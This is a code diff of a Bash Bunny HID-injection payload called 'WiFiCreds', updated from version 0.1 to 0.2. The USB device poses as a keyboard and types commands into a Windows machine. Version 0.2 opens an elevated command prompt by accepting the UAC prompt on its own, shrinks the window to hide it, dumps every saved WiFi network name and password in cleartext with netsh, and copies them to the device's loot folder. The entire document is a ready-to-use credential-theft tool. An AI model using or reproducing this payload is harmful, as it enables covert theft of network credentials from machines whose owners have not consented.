@@ -2,36 +2,54 @@
 #
 # Title:         WiFiCreds
 # Author:        illwill
-# Version:       0.1
+# Version:       0.2
 #
 # Dumps the stored plaintext Wifi SSID & passwords from Windows boxes using Powershell
 # then stashes them in /root/udisk/loot/WiFiCreds
 #
-# White..............Setup
 # Blue...............Running Script
 # Purple.............Got WiFi Creds
 
 # Source bunny_helpers.sh to get environment variable SWITCH_POSITION
 source bunny_helpers.sh
 
-LED RGB 200
+LED R 200
 LOOTDIR=/root/udisk/loot/WiFiCreds
 mkdir -p $LOOTDIR
 
 ATTACKMODE HID STORAGE
 LED B 200
-Q GUI r
+Q GUI
 Q DELAY 100
-Q STRING POWERSHELL
+Q STRING CMD
+Q DELAY 400
+Q CTRL-SHIFT ENTER
+Q DELAY 2500
+Q LEFTARROW
+Q DELAY 100
 Q ENTER
-Q DELAY 500
-Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q DELAY 1000
+Q STRING mode con:cols=18 lines=1
 Q ENTER
 Q DELAY 100
-Q STRING \(netsh wlan show profiles\) \| Select-String \"\\:\(.+\)\$\" \| \%\{\$name\=\$_.Matches.Groups\[1\].Value.Trim\(\)\; \$_\} \| 
-Q STRING \%\{\(netsh wlan show profile name\=\""\$name\"" key\=clear\)\}  \| Select-String \""Key Content\\W+\\:(.+)\$\"" \|
-Q STRING \%\{\$pass\=\$_.Matches.Groups\[1\].Value.Trim\(\)\; \$_\} \| \%\{\[PSCustomObject\]@\{ "PROFILE_NAME"\=\$name\;PASSWORD\=\$pass \}\} \|
-Q STRING Format-Table -AutoSize \| Out-File \$Bunny\\loot\\WiFiCreds\\WiFiCreds_\$env:computername.txt
+Q STRING for \/f "%D" in \(\'wmic LogicalDisk get Caption\^\, VolumeName \^\| find \"BashBunny\"\'\) do set BUNNY\=\%D
 Q ENTER
+Q DELAY 100
+Q STRING echo. \& for \/f \"tokens\=4 delims\=: \" \%a in \(\'netsh wlan show profiles "^"\| find \"Profile \"\'\) d 
+Q STRING o \@echo off \> nul \& \(netsh wlan show profiles name\=\%a key\=clear \| findstr \"SSID Content Authentication\" \| find \/v \"Number\" \& echo.\) \>\>\%BUNNY\%\\loot\\WifiCreds\\\%COMPUTERNAME%\.txt
+Q ENTER
+Q DELAY 100
+Q STRING echo.\>\%BUNNY\%\\loot\\WifiCreds\\DONE
+Q ENTER
+Q DELAY 100
+Q STRING EXIT
+Q ENTER
+Q DELAY 10000
 sync
-LED R B 200
+
+if [ -f "$LOOTDIR/DONE"  ]; then
+   rm "$LOOTDIR/DONE"
+   LED R B 200
+else
+   LED R
+fi
